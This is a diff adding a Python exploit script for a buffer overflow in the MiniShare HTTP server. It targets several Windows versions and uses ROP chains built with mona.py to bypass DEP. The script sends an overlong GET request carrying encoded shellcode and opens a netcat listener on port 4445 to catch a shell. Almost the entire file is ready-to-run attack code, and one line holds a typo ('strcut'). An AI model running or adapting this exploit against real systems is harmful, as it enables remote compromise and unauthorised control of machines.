@@ -1,0 +1,237 @@
+#!/usr/bin/python
+
+''' this script works for the included target systems, when minishare(ver not included intentionally) is used. 
+Even with some system that has Data Execution Protection enabled. '''
+import socket,sys,time,os,struct
+
+''' in the immunity debugger, use command '!mona rop -m *.dll -cp nonull' to build the rop_chain, built-in function
+
+    Register setup for VirtualProtect() :
+    --------------------------------------------
+    EAX = NOP (0x90909090)
+    ECX = lpOldProtect (ptr to W address)
+    EDX = aNewProtect (0x40)
+    EBX = dwSize
+    ESP = lPAddress (automatic)
+    EBP = ReturnTo (ptr to jmp esp)
+    ESI = ptr to VirtualProtect()
+    EDI = ROP NOP (RETN)
+    --- alternative chain ---
+    EAX = tr to &VirtualProtect()
+    ECX = lpOldProtect (ptr to W address)
+    EDX = NewProtect (0x40)
+    EBX = dwSize
+    ESP = lPAddress (automatic)
+    EBP = POP (skip 4 bytes)
+    ESI = ptr to JMP [EAX]
+    EDI = ROP NOP (RETN)
+    + place ptr to "jmp esp" on stack, below PUSHAD
+    -------------------------------------------- '''
+
+def create_rop_chainvp(): #VirtualProtect() method
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = ""
+    rop_gadgets += struct.pack('<L',0x77bbcfae) # POP ECX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x7c8d12e4) # ptr to &VirtualProtect() [IAT SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x773c43c6) # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.d$
+    rop_gadgets += struct.pack('<L',0x77bb0c86) # XCHG EAX,ESI # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x7c87c7af) # POP EBP # RETN [ntdll.dll]
+    rop_gadgets += struct.pack('<L',0x76f73bc3) # & call esp [winrnr.dll]
+    rop_gadgets += struct.pack('<L',0x7c97d5a2) # POP EAX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0xfffffdff) # Value to negate, will become 0x00000201
+    rop_gadgets += struct.pack('<L',0x77c523a1) # NEG EAX # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x7c87c763) # POP EBX # RETN [ntdll.dll]
+    rop_gadgets += struct.pack('<L',0xffffffff) #
+    rop_gadgets += struct.pack('<L',0x7c9706d1) # INC EBX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x773c43c7) # ADD EBX,EAX # XOR EAX,EAX # RETN [USER32.dl$
+    rop_gadgets += struct.pack('<L',0x77cd9d83) # POP EAX # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0xffffffc0) # Value to negate, will become 0x00000040
+    rop_gadgets += struct.pack('<L',0x76f71676) # NEG EAX # RETN [winrnr.dll]
+    rop_gadgets += struct.pack('<L',0x77bb8285) # XCHG EAX,EDX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x7c92ece3) # POP ECX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x775a2eee) # &Writable location [COMCTL32.DLL]
+    rop_gadgets += struct.pack('<L',0x5f28309d) # POP EDI # RETN [hnetcfg.dll]
+    rop_gadgets += struct.pack('<L',0x77f6e642) # RETN (ROP NOP) [ADVAPI32.dll]
+    rop_gadgets += struct.pack('<L',0x77bc5f6e) # POP EAX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x90909090) # nop
+    rop_gadgets += struct.pack('<L',0x7c92e7ba) # PUSHAD # RETN [SHELL32.dll]
+    return rop_gadgets
+
+rop_chainvp = create_rop_chainvp()
+
+
+def create_rop_chain2k3(): #VirtualAlloc() method
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = ""
+    rop_gadgets += struct.pack('<L',0x77c1abca) # POP EAX # RETN [GDI32.dll]
+    rop_gadgets += struct.pack('<L',0x7c8d12e0) # ptr to &VirtualAlloc() [IAT SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x7ca1ab1c) # MOV EAX,DWORD PTR DS:[EAX] # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x77bb0c86) # XCHG EAX,ESI # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x77bd9938) # POP EBP # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x76f73bc3) # & call esp [winrnr.dll]
+    rop_gadgets += struct.pack('<L',0x77da3698) # POP EBX # RETN [SHLWAPI.dll]
+    rop_gadgets += struct.pack('<L',0x00000001) # 0x00000001-> ebx
+    rop_gadgets += struct.pack('<L',0x77be1ec9) # POP EDX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x00001000) # 0x00001000-> edx
+    rop_gadgets += struct.pack('<L',0x7c92f079) # POP ECX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x00000040) # 0x00000040-> ecx
+    rop_gadgets += struct.pack('<L',0x5f27a003) # POP EDI # RETN [hnetcfg.dll]
+    rop_gadgets += struct.pack('<L',0x77f6e642) # RETN (ROP NOP) [ADVAPI32.dll]
+    rop_gadgets += struct.pack('<L',0x7ca4a7c2) # POP EAX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x90909090) # nop
+    rop_gadgets += struct.pack('<L',0x7c92e7ba) # PUSHAD # RETN [SHELL32.dll]
+    return rop_gadgets
+
+rop_chain2k3 = create_rop_chain2k3()
+
+def create_rop_chain7():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = ""
+    rop_gadgets += struct.pack('<L',0x7614e42c) # POP ECX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x70521388) # ptr to &VirtualProtect() [IAT COMCTL32.DLL]
+    rop_gadgets += struct.pack('<L',0x7633fd52)    # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]
+    rop_gadgets += struct.pack('<L',0x761001c2) # POP EBP # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x74283bb8) # & call esp [NLAapi.dll]
+    rop_gadgets += struct.pack('<L',0x771e1b23) # POP EBX # RETN [USER32.dll]
+    rop_gadgets += struct.pack('<L',0x00000201) # 0x00000201-> ebx
+    rop_gadgets += struct.pack('<L',0x7611e5a3) # POP EDX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x00000040) # 0x00000040-> edx
+    rop_gadgets += struct.pack('<L',0x75bfb8d8) # POP ECX # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x767bbd2a) # &Writable location [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x75bd84c6) # POP EDI # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x75f265e2) # RETN (ROP NOP) [ole32.dll]
+    rop_gadgets += struct.pack('<L',0x7639ea50) # POP EAX # RETN [MSCTF.dll]
+    rop_gadgets += struct.pack('<L',0x90909090) # nop
+    rop_gadgets += struct.pack('<L',0x765183a7) # PUSHAD # RETN [SHELL32.dll]
+    return rop_gadgets
+
+rop_chain7 = create_rop_chain7()
+
+def create_rop_chainxp2():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = ""
+    rop_gadgets += struct.pack('<L',0x7cb18345) # POP EAX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x77c11120) # ptr to &VirtualProtect() [IAT msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x77e830ca) # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x7cad6de9) # MOV ESI,EAX # DEC ECX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x7c935968) # POP EBP # RETN [ntdll.dll]
+    rop_gadgets += struct.pack('<L',0x77c35459) # & push esp # ret [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x7ca326d6) # POP EAX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0xfffffdff) # Value to negate, will become 0x00000201
+    rop_gadgets += struct.pack('<L',0x77e9d5b3) # NEG EAX # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x7ca485b4) # XCHG EAX,EBX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x77c5287b) # POP EAX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0xffffffc0) # Value to negate, will become 0x00000040
+    rop_gadgets += struct.pack('<L',0x77eda393) # NEG EAX # RETN [RPCRT4.dll]
+    rop_gadgets += struct.pack('<L',0x7c9c1058) # XCHG EAX,EDX # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x77c2f03d) # POP ECX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x77da0f1c) # &Writable location [USER32.dll]
+    rop_gadgets += struct.pack('<L',0x7ca3d0e6) # POP EDI # RETN [SHELL32.dll]
+    rop_gadgets += struct.pack('<L',0x77d74962) # RETN (ROP NOP) [USER32.dll]
+    rop_gadgets += struct.pack('<L',0x77c34fcd) # POP EAX # RETN [msvcrt.dll]
+    rop_gadgets += struct.pack('<L',0x90909090) # nop
+    rop_gadgets += struct.pack('<L',0x7cb9a1c3) # PUSHAD # RETN [SHELL32.dll]
+    return rop_gadgets
+
+rop_chainxp2 = create_rop_chainxp2()
+
+
+try:
+    target_address = sys.argv[1]
+    target_port = sys.argv[2]
+    target_system = sys.argv[3]
+except Exception as e:
+    usage = 'usage: ' + sys.argv[0] + ' [target ip] [traget port] [target system]'
+    print usage
+    print 'Number Target'
+    print ' 0 Win2k SP0-SP3'
+    print ' 1 Win2k SP4'
+    print ' 2 WinXP SP0-SP1'
+    print ' 3 WinXP SP2'
+    print ' 4 Win2k3 SP0'
+    print ' 5 Win7 N'
+    print ' 6 Win2k3 SP1'
+    print ' 7 Win7 N with DEP enabled' 
+else:
+    target_address = sys.argv[1]
+    target_port = int(sys.argv[2])
+    target_system = int(sys.argv[3])
+
+    if target_system == 0:
+        esp = struct.pack('<L',0x7754a3ab)
+    elif target_system == 1:
+        esp = struct.pack('<L',0x7517f163)
+    elif target_system == 2:
+        esp = struct.pack('<L',0x71ab1d54)
+    elif target_system == 3:
+        esp = struct.pack('<L',0x71ab9372)
+    elif target_system == 4:
+        esp = struct.pack('<L',0x71c03c4d)
+    elif target_system == 5:
+        esp = struct.pack('<L',0x7595f8f7)
+    elif target_system == 6:
+        esp = struct.pack('<L',0x77e41b88)
+    elif target_system == 7:
+        esp = strcut.pack('<L',0x75f52d4f)
+
+    shell = (
+    "\xdb\xc1\xbd\x4d\xd4\xf7\x62\xd9\x74\x24\xf4\x5a\x33\xc9" +
+    "\xb1\x4f\x31\x6a\x19\x03\x6a\x19\x83\xc2\x04\xaf\x21\x0b" +
+    "\x8a\xa6\xca\xf4\x4b\xd8\x43\x11\x7a\xca\x30\x51\x2f\xda" +
+    "\x33\x37\xdc\x91\x16\xac\x57\xd7\xbe\xc3\xd0\x5d\x99\xea" +
+    "\xe1\x50\x25\xa0\x22\xf3\xd9\xbb\x76\xd3\xe0\x73\x8b\x12" +
+    "\x24\x69\x64\x46\xfd\xe5\xd7\x76\x8a\xb8\xeb\x77\x5c\xb7" +
+    "\x54\x0f\xd9\x08\x20\xa5\xe0\x58\x99\xb2\xab\x40\x91\x9c" +
+    "\x0b\x70\x76\xff\x70\x3b\xf3\xcb\x03\xba\xd5\x02\xeb\x8c" +
+    "\x19\xc8\xd2\x20\x94\x11\x12\x86\x47\x64\x68\xf4\xfa\x7e" +
+    "\xab\x86\x20\x0b\x2e\x20\xa2\xab\x8a\xd0\x67\x2d\x58\xde" +
+    "\xcc\x3a\x06\xc3\xd3\xef\x3c\xff\x58\x0e\x93\x89\x1b\x34" +
+    "\x37\xd1\xf8\x55\x6e\xbf\xaf\x6a\x70\x67\x0f\xce\xfa\x8a" +
+    "\x44\x68\xa1\xc2\xa9\x46\x5a\x13\xa6\xd1\x29\x21\x69\x49" +
+    "\xa6\x09\xe2\x57\x31\x6d\xd9\x2f\xad\x90\xe2\x4f\xe7\x56" +
+    "\xb6\x1f\x9f\x7f\xb7\xf4\x5f\x7f\x62\x5a\x30\x2f\xdd\x1a" +
+    "\xe0\x8f\x8d\xf2\xea\x1f\xf1\xe2\x14\xca\x84\x25\x82\x35" +
+    "\x3e\xa5\xbe\xde\x3d\xb5\x51\x42\xcb\x53\x3b\x6c\x9d\xcc" +
+    "\xd4\x15\x84\x86\x45\xd9\x12\x0e\xe5\x48\xf9\xce\x60\x71" +
+    "\x56\x99\x25\x47\xaf\x4f\xd8\xfe\x19\x6d\x21\x66\x61\x35" +
+    "\xfe\x5b\x6c\xb4\x73\xe7\x4a\xa6\x4d\xe8\xd6\x92\x01\xbf" +
+    "\x80\x4c\xe4\x69\x63\x26\xbe\xc6\x2d\xae\x47\x25\xee\xa8" +
+    "\x47\x60\x98\x54\xf9\xdd\xdd\x6b\x36\x8a\xe9\x14\x2a\x2a" +
+    "\x15\xcf\xee\x5a\x5c\x4d\x46\xf3\x39\x04\xda\x9e\xb9\xf3" +
+    "\x19\xa7\x39\xf1\xe1\x5c\x21\x70\xe7\x19\xe5\x69\x95\x32" +
+    "\x80\x8d\x0a\x32\x81")
+
+    buffer = "GET "
+    buffer += "\x41" * 1787
+
+    if target_system == 6:
+        buffer += rop_chain2k3
+#        buffer += rop_chainva
+    elif target_system == 7:
+        buffer += rop_chain7
+#    elif target_system == 8
+#        buffer += rop_chainxp2
+    else:
+        buffer += esp
+    buffer += "\x90" * 16
+    buffer += shell
+    buffer += "\x44" * (2220 - len(buffer))
+    buffer += " HTTP/1.1\r\n\r\n"
+
+    print '[*] Connecting target Minishare server...'
+    time.sleep(0.5)
+    print '[*] Injecting shellcode...'
+    time.sleep(0.5)
+    print '[*] Attempting netcat session...'
+    time.sleep(0.5)
+    print '[*] Expecting a shell on port 4445...\n'
+
+    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=sock.connect((target_address,target_port))
+    sock.send(buffer)
+    os.system("nc -lvp 4445")
+    sock.close()
